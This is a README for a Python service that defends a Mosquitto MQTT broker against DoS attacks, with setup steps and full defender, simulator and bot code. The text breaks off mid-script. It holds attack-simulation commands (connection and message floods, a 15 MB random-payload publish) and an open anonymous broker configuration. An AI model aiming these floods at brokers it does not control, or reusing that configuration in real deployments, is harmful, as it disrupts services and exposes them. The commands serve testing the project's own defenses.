# MQTT DoS Protection Mechanism

This project is a comprehensive, 7-layer defense mechanism developed in Python to protect an MQTT broker (Mosquitto) from common Denial of Service (DoS) attacks prevalent in IoT environments. The system is designed to be lightweight, configurable, and effective, providing real-time threat detection and response.


# 📋 Table of Contents
1. Key Features

2. System Architecture

3. Prerequisites

4. Setup and Installation

  *   Step 1: Broker Setup (Mosquitto)
  
  *   Step 2: Defense Mechanism Setup

  *   Step 3: Legitimate Clients Setup (Simulators)

  *   Step 4: Notification Bot Setup

5. Simulating an Attack

6. Configuration File Explained (config.ini)

7. Project Files (Full Code)

## ✨ Key Features
**The defense mechanism consists of 7 integrated protection layers:**

* Layer 1: IP-based Connection Rate Limiting.

* Layer 2: Tor Exit Node Connection Blocking.

* Layer 3: Idle Connection Detection and Termination.

* Layer 4: Message Rate Limiting.

* Layer 5: Large Payload Message Prevention.

* Layer 6: Topic Whitelisting.

* Layer 7: Wildcard Subscription (#) Blocking.

## 🏗️ System Architecture
**The system consists of:**


* Broker Server: Mosquitto running on a Linux OS (e.g., hosted on AWS).


* Defense Mechanism: The main Python script running as a systemd service on the same server.


* Legitimate Clients: Python scripts simulating various IoT sensors (Gas Detector, Door Sensor).


* Notification System: A Telegram bot for real-time security alerts.


* Attacker: A Kali Linux machine to execute attack scripts.

## 🛠️ Prerequisites
`A server running a Debian-based Linux OS (e.g., Ubuntu, Debian).`

`Python 3.8+ and pip.`

`A Telegram account and a Bot Token obtained from BotFather.`

## 🚀 Setup and Installation
**Step 1: Broker Setup (Mosquitto) On your Linux server, execute the following commands:**
```Bash

# Update the system and install Mosquitto
sudo apt-get update && sudo apt-get upgrade -y
sudo apt-get install mosquitto mosquitto-clients -y
```

**Edit the configuration file to allow external connections:**

`sudo nano /etc/mosquitto/mosquitto.conf`

Add the following two lines to the end of the file:
```Ini, TOML
log_timestamp true
log_type all
listener 1883 0.0.0.0
allow_anonymous true

```
Save the file (Ctrl+X, then Y, then Enter) and restart the service:
```Bash

sudo systemctl restart mosquitto
sudo systemctl enable mosquitto
```
**Step 2: Defense Mechanism Setup Clone this repository to your server.**

Navigate to the project directory and install the required Python libraries.
```Bash

pip3 install -r requirements.txt
```
**Create the necessary directories for the script's operation.**
```Bash

sudo mkdir -p /etc/mosquitto_protector /var/lib/mosquitto_protector
```

**Copy the configuration, main script, and service files to their system paths.**
```Bash

sudo cp config.ini /etc/mosquitto_protector/
sudo cp MQTTDosProtected.py /usr/local/bin/
sudo cp mosquitto_protector.service /etc/systemd/system/
```
**Reload the systemd daemon and enable the protector service to run on boot.**
```Bash

sudo systemctl daemon-reload
sudo systemctl enable --now mosquitto_protector.service
```
**(Optional) Check the status of the service to ensure it's running.**
```Bash

sudo systemctl status mosquitto_protector.service
```
**Step 3: Legitimate Clients Setup (Simulators)
Run the simulated sensor scripts on any machine that can reach the server. Make sure to update the MQTT_BROKER IP address in each script. To run them:***
```Bash

python3 GasDetector.py
python3 DoorSensor.py
```
**Step 4: Notification Bot Setup (Optional)**

* Open the telegram_bot.py file.

* Paste your Bot Token into the TELEGRAM_TOKEN variable.

* Update the MQTT_BROKER variable with your server's IP address.

Run the bot script:
```Bash

python3 telegram_bot.py
```
## ⚔️ Simulating an Attack
**From an attacker machine (e.g., Kali Linux), run the following scripts to test the defense mechanism. Replace <BROKER_IP> with your server's IP.**

**Connection Flood Attack:**
```Bash

python3 ConnectFlood.py -a <BROKER_IP> -k 600
```

**Message Flood Attack:**
```Bash

python3 MessageFlood.py -a <BROKER_IP> -t "home/gas_sensor" -c 500
```

**Large Payload Attack:**
```Bash

head -c 15M /dev/urandom | mosquitto_pub -h <BROKER_IP> -t "home/security/door_sensor/entrance" -s
```

**You will observe that the attacker's IP gets banned, and a notification is sent to the Telegram bot.**

## ⚙️ Configuration File Explained (config.ini)
**The script's behavior can be fully customized via the /etc/mosquitto_protector/config.ini file.**

| Parameter | Section | Description |
| :--- | :--- | :--- |
| `ban_duration_seconds` | `[General]` | The duration (in seconds) for a temporary IP ban. |
| `check_interval_seconds` | `[General]` | The interval between each check cycle by the script. |
| `max_connections_per_ip` | `[Protection]` | The maximum number of connections allowed from a single IP. |
| `max_idle_clients_trigger`| `[Protection]` | The number of idle clients that triggers the idle flood detection. |
| `idle_timeout_seconds` | `[Protection]` | The time (in seconds) after which a client is considered idle. |
| `max_message_size_bytes` | `[Protection]` | The maximum allowed message size in bytes. |
| `rate_limit_count` | `[RateLimiting]`| The max number of messages allowed within a time window. |
| `rate_limit_seconds` | `[RateLimiting]`| The time window (in seconds) for the rate limit count. |
| `whitelisted_ips` | `[Whitelists]` | A list of trusted IPs that will never be banned. |

## 📁 Project Files (Full Code)
<details>
<summary><b>MQTTDosProtected.py (Main Defense Script)</b></summary>
  
```Python

#!/usr/bin/python3
import subprocess
import time
import logging
import os
import psutil
import re
import requests
import configparser
from collections import Counter, defaultdict
import paho.mqtt.client as mqtt
import json

# --- Logging Setup (The only hardcoded path) ---
LOG_FILE = "/var/log/mosquitto_protector_python.log"
logging.basicConfig(
    filename=LOG_FILE, level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# --- In-Memory Data Structures ---
managed_bans = {}
tor_blacklist = set()
client_states = {}
client_message_tracker = defaultdict(list)
last_read_pos = 0

# --- Helper Functions ---
def run_command(args, check_errors=True):
    try:
        command = ['sudo'] + args
        result = subprocess.run(command, capture_output=True, text=True, check=check_errors)
        return result
    except Exception as e:
        logging.error(f"Command execution failed: {e}")
        return None

def save_banned_ips_to_file(banned_ips_file):
    try:
        with open(banned_ips_file, 'w') as f:
            for ip, unban_timestamp in managed_bans.items():
                f.write(f"{ip} {unban_timestamp}\n")
    except Exception as e:
        logging.error(f"Error writing to {banned_ips_file}: {e}")

def is_ip_banned(ip_address, mosquitto_port):
    cmd = ['iptables', '-C', 'INPUT', '-s', ip_address, '-p', 'tcp', '--dport', str(mosquitto_port), '-j', 'DROP']
    result = run_command(cmd, check_errors=False)
    return result and result.returncode == 0

def ban_ip(ip_address, reason, config):
    whitelisted_ips = [ip.strip() for ip in config.get('Whitelists', 'whitelisted_ips').strip().split('\n') if ip.strip()]
    mosquitto_port = config.getint('MQTT', 'port')
    if ip_address in whitelisted_ips: return False
    if not is_ip_banned(ip_address, mosquitto_port):
        logging.warning(f"Banning IP: {ip_address}. Reason: {reason}")
        cmd = ['iptables', '-I', 'INPUT', '1', '-s', ip_address, '-p', 'tcp', '--dport', str(mosquitto_port), '-j', 'DROP']
        run_command(cmd)
        return True
    return False

def unban_ip(ip_address, mosquitto_port):
    logging.info(f"Starting unban process for IP: {ip_address}")
    while is_ip_banned(ip_address, mosquitto_port):
        logging.info(f"Removing iptables rule for IP: {ip_address}")
        cmd = ['iptables', '-D', 'INPUT', '-s', ip_address, '-p', 'tcp', '--dport', str(mosquitto_port), '-j', 'DROP']
        run_command(cmd)

def update_tor_blacklist_file(config, update_interval_hours=25):
    global tor_blacklist
    tor_blacklist_file = config.get('Paths', 'tor_blacklist_file')
    TOR_LIST_URL = "https://www.dan.me.uk/torlist/?exit"
    needs_update = False
    if os.path.exists(tor_blacklist_file):
        file_mod_time = os.path.getmtime(tor_blacklist_file)
        if (time.time() - file_mod_time) > (update_interval_hours * 3600):
            needs_update = True
            logging.info(f"Tor blacklist file is older than {update_interval_hours} hours. Update required.")
        else:
            logging.info("Tor blacklist is already up-to-date. No download needed at this time.")
    else:
        needs_update = True
        logging.info("Tor blacklist file not found. A new one will be downloaded.")
    if needs_update:
        logging.info(f"Starting download of latest Tor exit node list from {TOR_LIST_URL}...")
        try:
            response = requests.get(TOR_LIST_URL, timeout=15)
            response.raise_for_status()
            with open(tor_blacklist_file, 'w') as f:
                f.write(response.text)
            logging.info(f"Successfully updated and saved the Tor blacklist file at '{tor_blacklist_file}'.")
            logging.info("Reloading the updated Tor IP list into memory...")
            load_tor_blacklist(tor_blacklist_file)
        except requests.exceptions.RequestException as e:
            logging.error(f"Failed to download the Tor blacklist: {e}")

def load_tor_blacklist(tor_blacklist_file):
    if os.path.exists(tor_blacklist_file):
        with open(tor_blacklist_file, 'r') as f:
            tor_blacklist.clear()
            tor_blacklist.update(line.strip() for line in f if line.strip() and not line.startswith('#'))
        logging.info(f"Successfully loaded {len(tor_blacklist)} IPs into the in-memory Tor blacklist.")

def load_banned_ips_from_file(mqtt_client, config):
    global managed_bans
    banned_ips_file = config.get('Paths', 'banned_ips_file')
    mosquitto_port = config.getint('MQTT', 'port')
    alert_topic = config.get('MQTT', 'alert_topic')
    
    logging.info("Checking for previously banned IPs from file...")
    ips_to_unban_at_startup = []
    if not os.path.exists(banned_ips_file):
        logging.info(f"'{banned_ips_file}' not found. No IPs to load.")
        return
    active_bans_loaded = 0
    with open(banned_ips_file, 'r') as f:
        for line in f:
            line = line.strip()
            if not line: continue
            try:
                ip, unban_timestamp_str = line.split()
                unban_time = float(unban_timestamp_str)
                if time.time() < unban_time:
                    managed_bans[ip] = unban_time
                    active_bans_loaded += 1
                elif is_ip_banned(ip, mosquitto_port):
                    ips_to_unban_at_startup.append(ip)
            except ValueError:
                logging.warning(f"Skipping malformed line in {banned_ips_file}: '{line}'")
                continue
    logging.info(f"Loaded {active_bans_loaded} active bans from file.")
    if ips_to_unban_at_startup:
        logging.info(f"Found {len(ips_to_unban_at_startup)} expired bans still in firewall. Removing them now...")
        for ip in ips_to_unban_at_startup:
            unban_ip(ip, mosquitto_port)
            if mqtt_client:
                logging.info(f"Publishing UNBAN alert for IP {ip} (cleared at startup).")
                alert_payload = {"event": "IP_UNBANNED", "ip_address": ip, "reason": "Ban expired (cleared at startup)", "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}
                mqtt_client.publish(alert_topic, json.dumps(alert_payload), qos=1)
        logging.info("Restarting Mosquitto service after clearing expired bans from startup.")
        run_command(['systemctl', 'restart', 'mosquitto'])
    save_banned_ips_to_file(banned_ips_file)

def manage_bans(mqtt_client, config):
    mosquitto_port = config.getint('MQTT', 'port')
    banned_ips_file = config.get('Paths', 'banned_ips_file')
    alert_topic = config.get('MQTT', 'alert_topic')
    
    current_time = time.time()
    ips_to_unban = [ip for ip, unban_time in managed_bans.items() if current_time >= unban_time]
    if not ips_to_unban: return
    
    logging.info(f"Found {len(ips_to_unban)} bans that have expired. Unbanning now...")
    for ip in ips_to_unban:
        unban_ip(ip, mosquitto_port)
        if ip in managed_bans: del managed_bans[ip]
        if mqtt_client:
            logging.info(f"Publishing UNBAN alert for IP {ip}.")
            alert_payload = {"event": "IP_UNBANNED", "ip_address": ip, "reason": "Ban duration expired", "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}
            mqtt_client.publish(alert_topic, json.dumps(alert_payload), qos=1)
    save_banned_ips_to_file(banned_ips_file)
    logging.info(f"Restarting Mosquitto service after unbanning {len(ips_to_unban)} IP(s).")
    run_command(['systemctl', 'restart', 'mosquitto'])

def get_connections_per_ip(mosquitto_port):
    ip_counts = Counter()
    try:
        for conn in psutil.net_connections(kind='tcp'):
            if conn.laddr and conn.laddr.port == mosquitto_port and conn.raddr and conn.status == 'ESTABLISHED':
                ip_counts[conn.raddr.ip] += 1
    except psutil.AccessDenied:
        logging.error("Access Denied. Run with sudo.")
        raise
    return ip_counts

def process_mosquitto_log_for_activity(config):
    global last_read_pos, client_states, client_message_tracker
    
    # Load settings from config
    mosquitto_log_file = config.get('Paths', 'mosquitto_log_file')
    log_position_file = config.get('Paths', 'log_position_file')
    whitelisted_ips = [ip.strip() for ip in config.get('Whitelists', 'whitelisted_ips').strip().split('\n') if ip.strip()]
    whitelisted_patterns = [p.strip() for p in config.get('Whitelists', 'whitelisted_client_id_patterns').strip().split('\n') if p.strip()]
    allowed_topics = [t.strip() for t in config.get('Whitelists', 'allowed_publish_topics').strip().split('\n') if t.strip()]
    rate_limit_count = config.getint('RateLimiting', 'rate_limit_count')
    rate_limit_seconds = config.getint('RateLimiting', 'rate_limit_seconds')
    max_msg_size = config.getint('Protection', 'max_message_size_bytes')

    offenders_to_ban = defaultdict(lambda: {"client_ids": [], "reason": ""})
    client_pending_subscribe_check = None

    if not os.path.exists(mosquitto_log_file): return {}
    try:
        with open(mosquitto_log_file, 'r') as f:
            f.seek(last_read_pos)
            for line in f:
                current_time = time.time()
                parts = line.split()
                if not parts or not parts[0].strip(':').isdigit():
                    client_pending_subscribe_check = None
                    continue
                if client_pending_subscribe_check:
                    client_id = client_pending_subscribe_check
                    topic_parts = line.strip().split()
                    if len(topic_parts) > 1 and ('#' in topic_parts[1] or '+' in topic_parts[1]):
                        if client_id in client_states:
                            ip = client_states[client_id]["ip"]
                            offenders_to_ban[ip]["reason"] = f"Illegal wildcard subscription ('{topic_parts[1]}')"
                            offenders_to_ban[ip]["client_ids"].append(client_id)
                    client_pending_subscribe_check = None
                    continue
                if "New client connected from" in line:
                    try:
                        ip, client_id = parts[5].split(':')[0], parts[7]
                        is_whitelisted = (ip in whitelisted_ips or any(client_id.startswith(p.replace('*','')) for p in whitelisted_patterns if p.endswith('*')) or (client_id in whitelisted_patterns and '*' not in client_id))
                        if not is_whitelisted:
                            client_states[client_id] = {"ip": ip, "last_activity_time": current_time}
                    except IndexError: continue
                elif "Received PUBLISH from" in line:
                    try:
                        client_id = parts[4]
                        if client_id in client_states: client_states[client_id]["last_activity_time"] = current_time
                        is_whitelisted_client = any(client_id.startswith(p.replace('*','')) for p in whitelisted_patterns if p.endswith('*')) or (client_id in whitelisted_patterns and '*' not in client_id)
                        if not is_whitelisted_client:
                            timestamps = client_message_tracker[client_id]
                            timestamps.append(current_time)
                            timestamps = [ts for ts in timestamps if current_time - ts <= rate_limit_seconds]
                            client_message_tracker[client_id] = timestamps
                            if len(timestamps) > rate_limit_count:
                                reason = f"Message rate limit exceeded ({len(timestamps)} msgs in {rate_limit_seconds}s)"
                                if client_id in client_states:
                                    ip = client_states[client_id]["ip"]
                                    offenders_to_ban[ip]["reason"] = reason
                                    offenders_to_ban[ip]["client_ids"].append(client_id)
                                continue
                            size_match = re.search(r'\((\d+)\s+bytes\)', line)
                            if size_match and int(size_match.group(1)) > max_msg_size:
                                reason = f"Message size exceeded limit ({size_match.group(1)} bytes)"
                                if client_id in client_states:
                                    ip = client_states[client_id]["ip"]
                                    offenders_to_ban[ip]["reason"] = reason
                                    offenders_to_ban[ip]["client_ids"].append(client_id)
                                continue
                            published_topic = line.split("'")[1] if "'" in line else None
                            if published_topic and not any(mqtt.topic_matches_sub(allowed, published_topic) for allowed in allowed_topics):
                                reason = f"Illegal topic publish ('{published_topic}')"
                                if client_id in client_states:
                                    ip = client_states[client_id]["ip"]
                                    offenders_to_ban[ip]["reason"] = reason
                                    offenders_to_ban[ip]["client_ids"].append(client_id)
                    except IndexError: continue
                elif "Received SUBSCRIBE from" in line:
                    try:
                        client_id = parts[4]
                        if client_id in client_states: client_states[client_id]["last_activity_time"] = current_time
                        is_whitelisted_client = any(client_id.startswith(p.replace('*','')) for p in whitelisted_patterns if p.endswith('*')) or (client_id in whitelisted_patterns and '*' not in client_id)
                        if not is_whitelisted_client:
                            client_pending_subscribe_check = client_id
                    except IndexError: continue
                elif "Client" in line and "disconnected" in line:
                    try:
                        client_id = parts[1].strip('.')
                        if client_id in client_states: del client_states[client_id]
                        if client_id in client_message_tracker: del client_message_tracker[client_id]
                    except IndexError: continue
            last_read_pos = f.tell()
            with open(log_position_file, 'w') as pos_f: pos_f.write(str(last_read_pos))
    except Exception as e:
        logging.error(f"Error processing Mosquitto log: {e}")
    return offenders_to_ban

def main():
    logging.info("--- Mosquitto Protector script started ---")
    if os.geteuid() != 0:
        logging.error("Script must be run as root (with sudo).")
        return
    
    config = configparser.ConfigParser()
    config_path = '/etc/mosquitto_protector/config.ini'
    if not os.path.exists(config_path):
        logging.error(f"Configuration file not found at {config_path}. Exiting.")
        return
    config.read(config_path)

    # --- Read config values ---
    MQTT_BROKER = config.get('MQTT', 'broker')
    MQTT_PORT = config.getint('MQTT', 'port')
    ALERT_TOPIC = config.get('MQTT', 'alert_topic')
    CHECK_INTERVAL_SECONDS = config.getint('General', 'check_interval_seconds')
    BAN_DURATION_SECONDS = config.getint('General', 'ban_duration_seconds')
    whitelisted_ips = [ip.strip() for ip in config.get('Whitelists', 'whitelisted_ips').strip().split('\n') if ip.strip()]
    
    mosquitto_log_file = config.get('Paths', 'mosquitto_log_file')
    log_position_file = config.get('Paths', 'log_position_file')
    tor_blacklist_file = config.get('Paths', 'tor_blacklist_file')
    banned_ips_file = config.get('Paths', 'banned_ips_file')
    
    mosquitto_port = config.getint('MQTT', 'port')
    max_connections_per_ip = config.getint('Protection', 'max_connections_per_ip')
    max_idle_clients_trigger = config.getint('Protection', 'max_idle_clients_trigger')
    idle_timeout_seconds = config.getint('Protection', 'idle_timeout_seconds')

    # --- MQTT Client Setup ---
    mqtt_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="protector_client")
    try:
        mqtt_client.connect(MQTT_BROKER, MQTT_PORT, 60)
        mqtt_client.loop_start()
        logging.info("Connected to MQTT broker for management.")
    except Exception as e:
        logging.error(f"Could not connect to MQTT broker: {e}.")
        mqtt_client = None

    # --- Initialize state from files ---
    global last_read_pos
    saved_pos = 0
    if os.path.exists(log_position_file):
        try:
            with open(log_position_file, 'r') as f:
                content = f.read().strip()
                saved_pos = int(content) if content else 0
        except (ValueError, IOError): saved_pos = 0
    try:
        current_size = os.path.getsize(mosquitto_log_file)
        last_read_pos = saved_pos if saved_pos <= current_size else 0
        if saved_pos > current_size:
            logging.warning(f"Log file seems to have been cleared. Starting from the beginning.")
    except FileNotFoundError: last_read_pos = 0
    logging.info(f"Starting Mosquitto log read from position: {last_read_pos}")
    
    update_tor_blacklist_file(config)
    load_tor_blacklist(tor_blacklist_file)
    load_banned_ips_from_file(mqtt_client, config)

    # --- Main Loop ---
    try:
        last_tor_check_time = time.time()
        while True:
            if (time.time() - last_tor_check_time) > (25 * 3600):
                logging.info("25 hours have passed. Checking for Tor blacklist update...")
                update_tor_blacklist_file(config)
                last_tor_check_time = time.time()

            manage_bans(mqtt_client, config)
            connection_counts = get_connections_per_ip(mosquitto_port)
            offenders = process_mosquitto_log_for_activity(config)

            if offenders:
                for ip, data in offenders.items():
                    if ip in managed_bans or ip in whitelisted_ips: continue
                    reason, client_ids = data["reason"], list(set(data["client_ids"]))
                    if mqtt_client:
                        logging.info(f"Publishing BAN alert for IP {ip} due to '{reason}'.")
                        mqtt_client.publish(ALERT_TOPIC, json.dumps({"event": "IP_BANNED", "ip_address": ip, "reason": reason, "client_ids": client_ids, "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}), qos=1)
                    if ban_ip(ip, reason, config):
                        managed_bans[ip] = time.time() + BAN_DURATION_SECONDS
                        save_banned_ips_to_file(banned_ips_file)
                        logging.info(f"Restarting Mosquitto service after banning IP {ip}.")
                        run_command(['systemctl', 'restart', 'mosquitto'])

            idle_clients_for_ban = defaultdict(list)
            total_idle_count = 0
            for client_id, data in list(client_states.items()):
                if data["ip"] not in connection_counts:
                    if client_id in client_states: del client_states[client_id]
                    continue
                if (time.time() - data["last_activity_time"]) > idle_timeout_seconds:
                    idle_clients_for_ban[data["ip"]].append(client_id)
                    total_idle_count += 1
            
            if total_idle_count > max_idle_clients_trigger:
                for ip, client_ids_list in idle_clients_for_ban.items():
                    if ip in managed_bans or ip in whitelisted_ips: continue
                    reason = f"Idle Client Flood ({len(client_ids_list)} clients)"
                    if mqtt_client:
                        logging.info(f"Publishing BAN alert for IP {ip} due to '{reason}'.")
                        mqtt_client.publish(ALERT_TOPIC, json.dumps({"event": "IP_BANNED", "ip_address": ip, "reason": reason, "client_ids": client_ids_list, "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}), qos=1)
                    if ban_ip(ip, reason, config):
                        managed_bans[ip] = time.time() + BAN_DURATION_SECONDS
                        save_banned_ips_to_file(banned_ips_file)
                        for cid in client_ids_list:
                            if cid in client_states: del client_states[cid]
                        logging.info(f"Restarting Mosquitto service after banning IP {ip}.")
                        run_command(['systemctl', 'restart', 'mosquitto'])

            for ip, count in connection_counts.items():
                if ip in managed_bans or ip in whitelisted_ips: continue
                is_tor_ip, is_flooding = ip in tor_blacklist, count > max_connections_per_ip
                if is_tor_ip or is_flooding:
                    reason = "Tor Blacklist" if is_tor_ip else f"Connection Limit Exceeded ({count})"
                    if mqtt_client:
                        logging.info(f"Publishing BAN alert for IP {ip} due to '{reason}'.")
                        mqtt_client.publish(ALERT_TOPIC, json.dumps({"event": "IP_BANNED", "ip_address": ip, "reason": reason, "client_ids": [], "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')}), qos=1)
                    if ban_ip(ip, reason, config):
                        managed_bans[ip] = time.time() + BAN_DURATION_SECONDS
                        save_banned_ips_to_file(banned_ips_file)
                        logging.info(f"Restarting Mosquitto service after banning IP {ip}.")
                        run_command(['systemctl', 'restart', 'mosquitto'])
            
            time.sleep(CHECK_INTERVAL_SECONDS)

    except KeyboardInterrupt:
        logging.info("Script interrupted by user.")
    finally:
        if mqtt_client and mqtt_client.is_connected():
            mqtt_client.loop_stop()
            mqtt_client.disconnect()
        logging.info("--- Mosquitto Protector script stopped ---")

if __name__ == "__main__":
    main()
```
</details>

<details>
<summary><b>GasDetector.py (Simulated Client)</b></summary>
  
```Python

import random
import time
import paho.mqtt.client as mqtt
import json

# --- MQTT Settings ---
MQTT_BROKER = "YOUR_SERVER_IP"  # IMPORTANT: Replace with your server IP
MQTT_PORT = 1883
MQTT_TOPIC = "home/gas_sensor"
MQTT_CLIENT_ID = "gas_sensor_py"

# Simulation variables
MIN_GAS_LEVEL = 0
MAX_GAS_LEVEL = 1000  # parts per million (ppm)
NORMAL_GAS_LEVEL = 50
ALARM_THRESHOLD = 300

# Connection status
connected = False

def on_connect(client, userdata, flags, rc, properties=None):
    global connected
    if rc == 0:
        print("Successfully connected to MQTT broker!")
        connected = True
    else:
        print(f"Failed to connect to MQTT broker, error code: {rc}")
        connected = False

def on_disconnect(client, userdata, rc, properties=None):
    global connected
    print("Disconnected from MQTT broker")
    connected = False

def simulate_gas_level():
    # Simulate gas level with random fluctuations
    base_level = NORMAL_GAS_LEVEL
    
    # 5% chance of gas leak
    if random.random() < 0.05:
        base_level = random.randint(ALARM_THRESHOLD, MAX_GAS_LEVEL)
    else:
        # Normal fluctuations
        base_level += random.randint(-20, 20)
        base_level = max(MIN_GAS_LEVEL, min(base_level, NORMAL_GAS_LEVEL * 2))
    
    return base_level

def publish_data(client):
    if connected:
        # Simulate sensor reading
        gas_level = simulate_gas_level()
        status = "normal" if gas_level < ALARM_THRESHOLD else "warning"
        
        # Create JSON message
        message = {
            "gas_level": gas_level,
            "status": status,
            "unit": "ppm",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "sensor_id": "gas_sensor_1"
        }
        
        # Publish message
        result = client.publish(MQTT_TOPIC, json.dumps(message))
        
        if result.rc == mqtt.MQTT_ERR_SUCCESS:
            print(f"Message sent: {message}")
        else:
            print(f"Failed to send, error code: {result.rc}")
    else:
        print("No connection, cannot publish data")

def main():
    while True:
        # Create new MQTT client for each cycle
        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, MQTT_CLIENT_ID)
        client.on_connect = on_connect
        client.on_disconnect = on_disconnect

        try:
            # Connect to broker
            print("Connecting to MQTT broker...")
            client.connect(MQTT_BROKER, MQTT_PORT, 60)
            client.loop_start()
            
            # Wait for connection
            time.sleep(1)
            
            if connected:
                # Publish data
                publish_data(client)
                
                # Properly stop the client
                print("Disconnecting intentionally...")
                client.loop_stop()  # Stop the network loop first
                client.disconnect()  # Then disconnect
                time.sleep(1)  # Give time for clean disconnect
            
        except Exception as e:
            print(f"Error occurred: {e}")
        
        # Wait 5 seconds before reconnecting
        print("Waiting 5 seconds before reconnecting...")
        time.sleep(5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Program stopped by user")
```
</details>

<details>
<summary><b>DoorSensor.py (Simulated Client)</b></summary>
  
```Python

import paho.mqtt.client as mqtt
import time
import random
import json

# --- MQTT Configuration ---
MQTT_BROKER = "YOUR_SERVER_IP" # IMPORTANT: Replace with your server IP
MQTT_PORT = 1883
MQTT_TOPIC = "home/security/door_sensor/entrance"
CLIENT_ID_PREFIX = "DoorSensorTransient"

# --- Sensor Simulation Settings ---
PUBLISH_INTERVAL_SECONDS = 5
safe_publication_count = 0
WARNING_THRESHOLD = 10

# --- MQTT Callback Functions ---
def on_connect(client, userdata, flags, rc, properties=None):
    if rc == 0:
        print(f"[{client._client_id.decode()}] INFO: Connected to MQTT Broker...")
    else:
        print(f"[{client._client_id.decode()}] ERROR: Failed to connect, return code: {rc}")

def on_publish(client, userdata, mid, reasonCode=None, properties=None):
    print(f"[{client._client_id.decode()}] INFO: Message {mid} published successfully.")

def on_disconnect(client, userdata, rc, properties=None, reason=None):
    print(f"[{client._client_id.decode()}] INFO: Disconnected from MQTT Broker.")

# --- Function to generate sensor status message ---
def generate_sensor_status_message():
    global safe_publication_count
    status = "SAFE"
    message = "No activity detected. All clear."
    
    if safe_publication_count >= WARNING_THRESHOLD:
        status = "WARNING"
        message = "Unusual activity detected! Please check."
        safe_publication_count = 0
    else:
        safe_publication_count += 1
        
    current_time = time.strftime('%Y-%m-%d %H:%M:%S')
    
    payload = {
        "timestamp": current_time,
        "sensor_id": CLIENT_ID_PREFIX,
        "location": "Main Entrance",
        "topic": MQTT_TOPIC,
        "status": status,
        "message": message,
    }
    return json.dumps(payload)

# --- Main simulation loop ---
def run_door_person_sensor_simulator():
    try:
        while True:
            client_id = f"{CLIENT_ID_PREFIX}"
            client = mqtt.Client(client_id=client_id, callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
            client.on_connect = on_connect
            client.on_publish = on_publish
            client.on_disconnect = on_disconnect
            try:
                client.connect(MQTT_BROKER, MQTT_PORT, 60)
                client.loop_start()
                time.sleep(0.5)
                if client.is_connected():
                    sensor_data = generate_sensor_status_message()
                    print(f"[{client_id}] Publishing message: {sensor_data}")
                    info = client.publish(MQTT_TOPIC, sensor_data, qos=1)
                    info.wait_for_publish()
                    client.disconnect()
                else:
                    print(f"[{client_id}] Connection not established.")
            except Exception as e:
                print(f"[{client_id}] AN UNEXPECTED ERROR OCCURRED: {e}")
            finally:
                client.loop_stop()
                if client.is_connected():
                    client.disconnect()
            
            time.sleep(PUBLISH_INTERVAL_SECONDS)

    except KeyboardInterrupt:
        print("\n--- Simulator stopped by user (Ctrl+C). ---")

if __name__ == "__main__":
    run_door_person_sensor_simulator()
```
</details>

<details>
<summary><b>telegram_bot.py (Notification Bot)</b></summary>

```Python

import paho.mqtt.client as mqtt
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from telegram.error import Forbidden
import queue
import json
import asyncio
import os

# --- Settings ---
TELEGRAM_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN" # IMPORTANT: Replace with your token
MQTT_BROKER = "YOUR_SERVER_IP" # IMPORTANT: Replace with your server IP
MQTT_PORT = 1883
MQTT_SUBSCRIBE_TOPIC = "#"
MQTT_CLIENT_ID = "telegram_bot_mqtt_listener"

# --- Global Variables ---
SUBSCRIBERS_FILE = "subscribers.json"
subscribed_chat_ids = set()
message_queue = queue.Queue()
client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=MQTT_CLIENT_ID)

# --- Persistence Functions ---
def load_subscribers():
    global subscribed_chat_ids
    if os.path.exists(SUBSCRIBERS_FILE):
        with open(SUBSCRIBERS_FILE, 'r') as f:
            try:
                subscribed_chat_ids = set(json.load(f))
                print(f"Loaded {len(subscribed_chat_ids)} subscribers.")
            except json.JSONDecodeError:
                subscribed_chat_ids = set()
    else:
        print("Subscribers file not found. Starting fresh.")

def save_subscribers():
    with open(SUBSCRIBERS_FILE, 'w') as f:
        json.dump(list(subscribed_chat_ids), f)
    print(f"Saved {len(subscribed_chat_ids)} subscribers.")

# --- MQTT Callbacks ---
def on_connect(client, userdata, flags, rc, properties):
    if rc == 0:
        print(f"Connected to MQTT broker, subscribing to: {MQTT_SUBSCRIBE_TOPIC}")
        client.subscribe(MQTT_SUBSCRIBE_TOPIC)
    else:
        print(f"Failed to connect to MQTT broker, return code: {rc}")

def on_message(client, userdata, msg):
    try:
        message_content = msg.payload.decode('utf-8')
        print(f"Queueing message from topic '{msg.topic}'")
        message_queue.put((msg.topic, message_content))
    except Exception as e:
        print(f"Error processing MQTT message: {e}")

# --- Telegram Command Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user, chat_id = update.effective_user, update.effective_chat.id
    if chat_id not in subscribed_chat_ids:
        subscribed_chat_ids.add(chat_id)
        save_subscribers()
        await update.message.reply_text(f'Hello {user.first_name}! You are now subscribed.')
        print(f"New subscriber: {chat_id}")
    else:
        await update.message.reply_text('You are already subscribed.')

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in subscribed_chat_ids:
        subscribed_chat_ids.remove(chat_id)
        save_subscribers()
        await update.message.reply_text('You have been unsubscribed.')
        print(f"Subscriber removed: {chat_id}")
    else:
        await update.message.reply_text("You weren't subscribed.")

# --- Core Logic & Integration ---
async def process_mqtt_messages(application: Application):
    print("Message processing task started.")
    while True:
        try:
            topic, message_content = message_queue.get_nowait()
            # Try to format JSON for pretty printing, otherwise show raw text
            try:
                parsed_json = json.loads(message_content)
                pretty_json = json.dumps(parsed_json, indent=2)
                formatted_content = f"```json\n{pretty_json}\n```"
            except json.JSONDecodeError:
                formatted_content = f"`{message_content}`"

            telegram_message = (
                f"📡 **New MQTT Message**\n\n"
                f"**Topic:** `{topic}`\n"
